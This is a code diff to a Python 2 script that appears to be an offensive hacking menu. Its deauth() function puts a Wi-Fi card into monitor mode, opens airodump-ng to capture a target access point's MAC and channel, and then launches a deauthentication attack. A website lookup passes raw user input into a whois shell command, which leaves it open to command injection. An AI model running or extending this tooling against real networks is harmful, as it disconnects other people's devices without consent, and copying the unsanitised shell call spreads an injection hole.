@@ -203,7 +203,7 @@ def webSiteInfo():
         os.system("clear")
         server = raw_input("WebSite: ")
         ip = socket.gethostbyname(server)
-        print server, "----->", ip
+        print "scanning ---> " +  ip
         command = 'whois '+ server
         process = os.popen(command)
         info = str(process.read())
@@ -250,6 +250,8 @@ def deauth():
     print ga.red
     os.system("clear")
     os.system("figlet DEAUTH")
+    print "When airodump-ng opens be sure to capture the MAC and CHANNEL of the access point" 
+    print "Then press Ctrl+C"
     print "[1] wlan0"
     print "[2] wlan1"
     inter = input("> ")
@@ -257,14 +259,16 @@ def deauth():
         c = "airmon-ng start wlan0"
         p = os.popen(c)
         interface = "wlan0mon"
+	os.system("gnome-terminal -- airodump-ng wlan0mon")
     elif inter == 2:
         c = "airmon-ng start wlan1"
         p = os.popen(c)
         interface = "wlan1mon"
+	os.system("gnome-terminal -- airodump-ng wlan1mon")
     mac = raw_input("MAC Of The access point: ")
     channel = raw_input("Channel: ")
     os.system("clear")
-    os.system("figlet deauth Access Point")
+    os.system("figlet deauth NetWork")
     print "Ctrl+C To Stop The Attack"
     com = "iwconfig " + interface + " " +" channel " + channel
     pr = os.popen(com)
